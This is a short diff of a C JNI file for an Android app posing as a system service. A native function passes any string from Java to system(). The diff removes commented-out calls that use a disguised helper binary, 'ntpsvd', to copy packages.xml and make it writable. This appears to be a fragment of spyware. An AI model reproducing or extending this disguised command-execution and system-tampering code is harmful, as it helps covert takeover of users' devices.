@@ -27,11 +27,10 @@
 
 #define LOG(x)  printf(x)
 
-
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
 	JNIEnv *env;
 
-    __android_log_print(ANDROID_LOG_DEBUG, "QZ", "JNI_OnLoad c'e'");  
+    //__android_log_print(ANDROID_LOG_DEBUG, "QZ", "JNI_OnLoad c'e'");  
 
 	return JNI_VERSION_1_6;
 }
@@ -45,17 +44,7 @@ JNIEXPORT int JNICALL Java_com_android_service_ServiceCore_invokeRun (JNIEnv *en
 	system(exc);
 
 	(*env)->ReleaseStringUTFChars(env, cmd, exc);
-
-/*	execv("/system/bin/ntpsvd", pkg);  // Copia packages.xml
-	execv("/system/bin/ntpsvd", mode); // Rendilo scrivibile
-
-
-	jboolean isCopy;  
-    const char * szLogThis = (*env)->GetStringUTFChars(env, cmd, &isCopy);  
   
-    __android_log_print(ANDROID_LOG_DEBUG, "QZ", "NDK:LC: [%s]", szLogThis);  
-  
-    (*env)->ReleaseStringUTFChars(env, cmd, szLogThis);*/
 	return 0;
 }
 
